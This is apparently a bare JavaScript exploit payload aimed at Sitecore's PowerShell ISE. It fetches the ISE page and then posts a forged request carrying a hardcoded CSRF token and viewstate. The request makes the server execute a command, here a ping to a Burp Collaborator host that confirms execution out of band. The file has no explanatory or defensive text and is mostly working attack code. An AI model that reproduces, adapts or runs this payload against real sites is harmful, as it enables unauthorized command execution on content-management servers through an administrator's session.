var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/sitecore/shell/Applications/PowerShell/PowerShellIse?sc_bw=1',true);
req.send();
function handleResponse() {
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/sitecore/shell/Applications/PowerShell/PowerShellIse?sc_bw=1', true);
    changeReq.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    changeReq.send('&__PARAMETERS=ise%3Aexecute%28elevationResult%3D1%29%28elevationResult%3D1%29&__EVENTTARGET=&__EVENTARGUMENT=&__SOURCE=&__EVENTTYPE=&__CONTEXTMENU=&__MODIFIED=&__ISEVENT=1&__CSRFTOKEN=AAEAAAD%2F%2F%2F%2F%2FAQAAAAAAAAAGAQAAACRkNDQ5M2JhMy02Njk5LTQwOGMtYjVlZC02NjAyM2IyNjZkNzAL&__VIEWSTATE=FCA1620450974477A42A3E19A85D4C09&__VIEWSTATE=&scActiveRibbonStrip=&scGalleries=&SelectionText=&SelectionRange=&Breakpoints=&Editor=ping%20312jfnwvkptogg7u82fy0749d0jrff4.burpcollaborator.net')
};
